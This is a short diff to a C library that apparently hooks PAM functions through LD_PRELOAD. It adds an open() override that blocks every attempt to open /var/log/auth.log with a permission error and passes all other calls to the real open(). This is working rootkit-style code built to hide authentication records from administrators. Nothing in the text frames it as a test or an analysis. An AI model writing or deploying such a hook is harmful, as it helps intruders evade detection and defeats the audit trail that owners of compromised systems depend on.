@@ -27,3 +27,23 @@ const void* pam_get_item(void *pamh, int item)
     }
     return res;
 }
+
+int open(const char *pathname, int flags, ...)
+{
+    if (strcmp(pathname, "/var/log/auth.log") == 0) {
+        errno = EACCES;
+        return -1;
+    }
+    int (*orig_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
+    va_list args;
+    va_start(args, flags);
+    int fd;
+    if (flags & O_CREAT) {
+        int mode = va_arg(args, int);
+        fd = orig_open(pathname, flags, mode);
+    } else {
+        fd = orig_open(pathname, flags);
+    }
+    va_end(args);
+    return fd;
+}
